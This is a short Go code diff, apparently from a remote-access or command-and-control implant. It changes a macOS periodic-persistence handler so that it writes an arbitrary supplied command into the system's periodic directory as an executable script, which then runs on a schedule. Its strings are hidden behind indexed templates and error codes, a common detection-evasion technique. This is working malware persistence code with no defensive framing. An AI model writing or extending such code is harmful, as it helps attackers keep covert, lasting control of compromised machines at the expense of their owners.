@@ -484,12 +484,38 @@ func (c *PersistenceCommand) handlePeriodicPersistence(args []string) CommandRes
 		}
 	}
 
-	// Generate script name
+	// Generate script name - guard against short commands
+	if len(command) < 10 {
+		return CommandResult{
+			Error:       fmt.Errorf(Err(E1)),
+			ErrorString: Err(E1),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
+		}
+	}
 	scriptName := pTpl(idxDarwinScriptPrefix) + strings.Replace(command[:10], " ", "_", -1)
 	scriptPath := filepath.Join(periodicDir, scriptName)
 
-	// Create script content (used for reference, written by caller)
-	_ = pTpl(idxDarwinShebang) + "\n#\n# " + pTpl(idxDarwinPeriodic) + " " + frequency + " " + pTpl(idxDarwinTask) + "\n#\n\n" + command + "\n\n" + pTpl(idxDarwinExitZero) + "\n"
+	// Create script content and write to disk
+	scriptContent := pTpl(idxDarwinShebang) + "\n#\n# " + pTpl(idxDarwinPeriodic) + " " + frequency + " " + pTpl(idxDarwinTask) + "\n#\n\n" + command + "\n\n" + pTpl(idxDarwinExitZero) + "\n"
+
+	// Ensure periodic directory exists
+	if err := os.MkdirAll(periodicDir, 0755); err != nil {
+		return CommandResult{
+			Output:      ErrCtx(E11, periodicDir),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
+		}
+	}
+
+	// Write the script file with executable permissions
+	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0755); err != nil {
+		return CommandResult{
+			Output:      ErrCtx(E11, scriptPath),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
+		}
+	}
 
 	return CommandResult{
 		Output:      SuccCtx(S1, scriptPath),
